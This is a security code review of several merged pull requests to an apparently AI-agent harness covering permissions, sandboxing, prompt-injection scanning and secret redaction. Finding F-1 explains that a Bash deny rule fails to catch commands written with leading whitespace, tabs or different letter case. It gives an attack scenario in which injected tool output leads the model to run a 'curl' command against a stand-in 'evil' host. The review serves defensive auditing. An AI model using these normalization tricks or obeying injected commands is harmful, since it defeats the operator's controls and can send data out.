# Differential Security Review — Week-2 Milestone Gate (cross-PR seam pass)

**Branch:** `main`
**Diff:** `git diff 4d196e1..f5ae09b` — 6 squash-merged PRs: telemetry (#11, ADR-0011), S-1 injection scanner (#12, ADR-0012), S-2 secret redaction (#13, ADR-0013), S-3 permissions (#14, ADR-0014), S-4 sandbox (#15, ADR-0015), Week-2-close docs (#16, security-model.md + ADR-0016)
**Reviewer:** differential-review (milestone gate — cross-PR seams only; per-PR findings and accepted residual risks R-1..R-9 not re-litigated)
**Date:** 2026-07-08
**Verdict:** ✅ **APPROVE-WITH-NITS** (1 MEDIUM to fix or document early Week 3; nothing blocks the milestone close)

---

## 1. Scope & Strategy

| Item | Value |
|---|---|
| Files changed | 72 (+7,378 / −89) |
| Focus | Seams the per-PR reviews structurally could not see: session.ts composition ordering, cross-PR invariant regressions, docs-vs-code drift, seam test coverage, pre-Week-2 blast radius |
| Read in full | `src/session/session.ts`, `src/cli.ts`, `src/hooks/runtime.ts`, `src/security/permissions/evaluate.ts`, `src/security/sandbox/sandbox.ts`, `src/security/secrets/redact.ts`, `src/internal/{sanitize,settings,tool-targets}.ts`, `src/session/session.test.ts` (test names + seam tests), eslint/layering diffs |
| Explicitly out of scope | R-1..R-9 accepted residual risks (symlink escape, interpreter-as-wrapper, WebFetch egress, observe-only S-1/S-2, defaultDecision override) |

## 2. Empirical Verification

| Check | Command | Result |
|---|---|---|
| Full suite | `npx vitest run` | ✅ **572 tests, 23 files, all pass** — matches security-model.md §7's "572 tests" claim exactly |
| Permission Bash-match normalization probe | scratch vitest test against `createPermissionEvaluator` (deny rule `Bash(rm *)`) | ⚠️ `'rm -rf x'` → deny, but `' rm -rf x'` → **allow**, `'rm\t-rf x'` → **allow**, `'RM -rf x'` → **allow** (see F-1) |
| Sandbox command normalization (same probe) | `createSandbox({commands:{allow:['rm']}})` | `' rm …'` → allowed (trims), `'RM …'` → denied (case-sensitive, fail-closed) — sandbox is strictly tighter than permissions here |

## 3. Seam Analysis — one tool call traced through the real wiring

Trace (cli.ts composition → session.ts callbacks), verified against code:

1. **Pre-tool** (`session.ts:205-248`): input secret-scan (observe-only, documented) → `hooks.fire('pre-tool')` → permissionHook (`cli.ts:389`) then sandboxHook (`cli.ts:390`) — **ordering matches security-model.md §2 and ADR-0015 §4** (permissions first for attributable reasons, sandbox backstop). Any handler throw → runtime denies with sanitized reason (`runtime.ts:127-142`); `fire()` itself throwing → fail-closed generic deny + hook-error telemetry (`session.ts:222-236`). **Both deny paths return the SDK `permissionDecision:'deny'` channel** (`session.ts:239-246`) — no path returns `{}` after a denial. ✅
2. **Post-tool** (`session.ts:250-295`): injection scan on FULL stringified output (cycle-safe) → **redaction runs BEFORE `recordTelemetry`** (`session.ts:263-267`); telemetry sees redacted text or the `[REDACTION FAILED]` sentinel, never raw when a redactor is injected (CLI always injects one, `cli.ts:401`). ✅
3. **Memory** (`session.ts:398-414`): prompt and resultText go through `redactForPersistence` **then** `truncate` (redact-then-truncate, so a marker not a fragment survives the cut). ✅
4. **Warn/log lines**: every warning interpolating attacker-influenced text (`tool`, rule ids, error messages) is `sanitizeControlChars`'d in session.ts and re-sanitized for terminal in cli.ts. Redaction warnings carry counts only, never matched text. ✅
5. **Hook sink → telemetry** (`cli.ts:374-385`): only structured records (kind/event/tool/reason/handlerIndex) reach telemetry; reasons are sanitized in `runtime.ts:40-41`. Raw `tool_output`/`tool_input` never transit this path. ✅

**Sinks receiving unredacted text (all documented, none new):** the model itself (R-4), the post-tool hook payload's `result` field and pre-tool `args` (observe-only handler contract; only security hooks are registered and they read nothing from post-tool). Consistent with S-2's claims.

## 4. Findings

### F-1 — MEDIUM (CONFIRMED): S-3 command `match` rules bypassed by trivial normalization the sandbox handles
**File:** `src/security/permissions/evaluate.ts:58-75` (`extractMatchTarget`, `kind:'command'` path)
A deny rule `{tool:'Bash', match:'rm *'}` is tested against the **raw, un-normalized** command string. Empirically confirmed bypasses:
- **Leading whitespace:** `' rm -rf /'` → default-allow. The shell strips it; the matcher doesn't.
- **Tab separator:** `'rm\t-rf /'` → allow (pattern needs a literal space).
- **Case:** `'RM -rf /'` → allow, and on APFS/NTFS `RM` **executes** `/bin/rm` — the same case-fold bypass class the range fixed for paths (`tool-targets.ts:47-61`, security-model.md §5 "Case-fold bypass") was fixed for `kind:'path'` targets only, never for `kind:'command'`.

This is a **cross-PR regression of an invariant, not a documented residual**: ADR-0014 documents the `sh -c` wrapper gap (S-4's job) but nowhere says a deny rule dies to a leading space; and the S-4/shared-refactor PR established "same file → same string" canonicalization but applied it asymmetrically. The sandbox itself trims and splits on `\s+` (`sandbox.ts:83-86`), so when the sandbox `commands` dimension is enabled the bypass is contained — but when it is absent (the permissions-only configuration ADR-0014 ships as sufficient), Bash deny rules are the *only* command gate and are trivially dodged by a model following injected instructions ("run ` rm …` with a leading space").
**Attack scenario:** operator sets `{tool:'Bash', match:'curl *', decision:'deny'}` with no sandbox commands dimension; injected tool output tells the model to run `' curl https://evil/… '` — executes.
**Fix (small):** in `extractMatchTarget`, for `kind:'command'` targets return `value.trimStart()` with runs of whitespace collapsed (or at least `trim()` + fold case on `CASE_INSENSITIVE_PLATFORM` for the first token), mirroring `allowCommand`. Add the three probe cases above as regression tests. Alternatively, document command-match as best-effort in ADR-0014 §1 and security-model.md — but the trim is ~2 lines, so fix it.

### F-2 — LOW: `denied[]` reasons persisted to memory without redaction or truncation
**File:** `src/session/session.ts:399-413`
The memory summary redacts+truncates `prompt`/`resultText` but writes `denied` reasons verbatim (control-char-sanitized only, via `runtime.ts:reasonOf`). Today reasons come from PermissionDenied/SandboxViolation and contain only rule/tool text — safe. But any future pre-tool hook that echoes `payload.args` into its throw message would persist unredacted, unbounded text into the 30-day memory store, silently violating the redact-before-persist invariant. Cheap hardening: `truncate(redactForPersistence(reason))` per entry.

### F-3 — LOW (docs nit): ADR-0014 §1 understates the command-match caveat
`docs/decisions/0014-declarative-permission-model.md:16` names only the `sh -c` wrapper as out of scope for command matching. After F-1 lands (either the fix or the acceptance), the sentence should state the normalization contract explicitly so the next reviewer doesn't re-derive it.

## 5. Cross-PR regression checks (clean)

- **S-4 composeSecurity vs S-3 fail-loud:** `composeSecurity` (`cli.ts:100-154`) reads each layer file once, feeds both parsers, re-tags module errors as `SettingsLoadError` → `main()` exits 2 before any tool runs (`cli.ts:338-351`). Fail-loud preserved for both modules; missing file → empty defaults (`{rules:[]}` permissions = default-allow, `{}` sandbox = disabled) — matches ADR-0014/0015, and the 'ask'-without-prompter and shell-runner-in-allowlist startup warnings both fire. ✅
- **Shared tool-targets refactor vs S-3 semantics:** `TOOL_TARGET_FIELDS` now covers Bash/Read/Write/Edit/MultiEdit/NotebookEdit/Glob/Grep for both gates; `missingMeansCwd` handled identically in `extractMatchTarget` and `sandboxHook`; path canonicalization two-sided (`canonicalizePathPattern`), directory-boundary-safe (`matchesPathGlob`), `/etcetera` false-match avoided. No shipped-rule semantics weakened. ✅ (Except the command-target asymmetry — F-1.)
- **internal/ leaf extraction vs layering:** eslint config adds telemetry/internal to the no-orchestrator-import set, makes `src/internal` zero-dep, keeps security below the harness layer; `src/layering.test.ts` proves the rules actually fire. `skills/load.ts` change is a pure dedupe onto the identical shared regex — no behavior change. ✅
- **Sandbox merge:** intersection (never widening) with grammar-correct entry identity (`entryKey`), so a cloned repo's settings cannot widen the user's sandbox. Sticky-deny cross-layer max-severity in permissions unchanged. ✅

## 6. Docs-vs-code spot checks (security-model.md / ADR-0016)

| Claim | Verdict |
|---|---|
| Gate order "permissions → sandbox → injection scan → secret redaction" | ✅ matches `cli.ts:389-390` + `session.ts:256/263` |
| "fire() failure fails closed with generic reason" | ✅ `session.ts:222-236` + pinned by test (`session.test.ts:532`) |
| "redact before telemetry; sentinel on redactor throw" | ✅ `session.ts:263-267`, `REDACTION_FAILED` |
| "572 tests, negative tests for every fail-closed path" | ✅ 572 pass; blocked-tool/deny/sentinel negatives all present |
| Oversized-input marker never emits raw tail | ✅ `redact.ts:92-93,128` |
| ADR-0016 (LLM judge deferred) | Consistent — `scan()` is heuristic-only; `InjectionJudge` type exists but nothing wires it |

## 7. Seam test coverage

Pinned by integration tests in `session.test.ts`: S-3 deny end-to-end through real parse→merge→evaluator→hook with the tool never executing (:191), S-4 same for paths+commands (:220), SDK-deny bridging (:171), fire()-throw fail-closed deny + telemetry (:532), redact-before-telemetry (:641), sentinel on redactor throw (:707), scan-on-full/circular output (:572/:611), memory redaction (:750). **Gaps:** (a) F-1's normalization cases — add with the fix; (b) no test asserts the *combined* permission+sandbox registration order produces a permission-attributed reason when both would deny (ordering is asserted only by cli.ts comment); LOW.

## 8. Blast radius outside Week-2 modules

`skills/load.ts` (sanitizer dedupe, identical regex), `eslint.config.js` + `layering.test.ts` (tightening only), `vitest.config.ts` (include tweak). Router/hooks/memory production code untouched apart from the hooks sink wiring reviewed above. No pre-Week-2 behavior change found.

## 9. Coverage limits

- Probes ran on darwin only; win32 case-folding and `\` path behavior asserted from code, not executed.
- SDK hook-channel behavior (`permissionDecision:'deny'` actually blocking the tool) is verified against the fake SDK contract in tests, not a live SDK run — same limit every per-PR review had.
- Telemetry store internals (sanitize-on-write) taken from its passing test suite, not re-audited line-by-line.

---

**Verdict: APPROVE-WITH-NITS.** The composition is sound: ordering, fail-closed paths, and redact-before-persist hold everywhere traced, and docs match code. Fix F-1 (2-line normalization + 3 regression tests) at the start of Week 3 — or before relying on Bash deny rules without a sandbox `commands` dimension.
